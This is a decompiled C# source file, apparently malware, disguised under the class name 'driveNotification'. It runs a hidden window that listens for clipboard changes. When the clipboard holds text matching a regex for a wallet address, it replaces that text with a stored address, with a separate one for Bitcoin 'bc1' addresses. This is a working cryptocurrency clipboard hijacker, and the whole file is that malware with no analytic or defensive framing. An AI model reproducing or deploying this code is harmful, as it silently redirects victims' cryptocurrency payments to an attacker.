using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using ns0;

namespace ConsoleApplication7;

public sealed class driveNotification
{
	public class NotificationForm : Form
	{
		[CompilerGenerated]
		private sealed class Class3
		{
			public string string_0;

			public void method_0()
			{
				string_0 = Clipboard.GetText();
			}
		}

		[CompilerGenerated]
		private sealed class Class4
		{
			public string string_0;

			public void method_0()
			{
				Clipboard.SetText(string_0);
			}
		}

		private static string string_0 = GetText();

		protected override CreateParams CreateParams
		{
			get
			{
				CreateParams createParams = ((Form)this).get_CreateParams();
				createParams.set_ExStyle(createParams.get_ExStyle() | 0x80);
				return createParams;
			}
		}

		public NotificationForm()
		{
			Class0.Class1.SetParent(((Control)this).get_Handle(), Class0.Class1.intptr_0);
			Class0.Class1.AddClipboardFormatListener(((Control)this).get_Handle());
		}

		private bool method_0(Regex regex_0)
		{
			if (regex_0.Match(string_0).Success)
			{
				return true;
			}
			return false;
		}

		protected override void WndProc(ref Message m)
		{
			if (((Message)(ref m)).get_Msg() == 797)
			{
				string_0 = GetText();
				if (string_0.StartsWith("bc1"))
				{
					if (method_0(Class0.regex_0) && !string_0.Contains(Class0.string_13))
					{
						string text = Class0.regex_0.Replace(string_0, Class0.string_13);
						SetText(text);
					}
				}
				else if (method_0(Class0.regex_0) && !string_0.Contains(Class0.string_11))
				{
					string text2 = Class0.regex_0.Replace(string_0, Class0.string_11);
					SetText(text2);
				}
			}
			((Form)this).WndProc(ref m);
		}

		public static string GetText()
		{
			string string_0 = string.Empty;
			Thread thread = new Thread((ThreadStart)delegate
			{
				string_0 = Clipboard.GetText();
			});
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
			thread.Join();
			return string_0;
		}

		public static void SetText(string txt)
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				Clipboard.SetText(txt);
			});
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
			thread.Join();
		}
	}
}
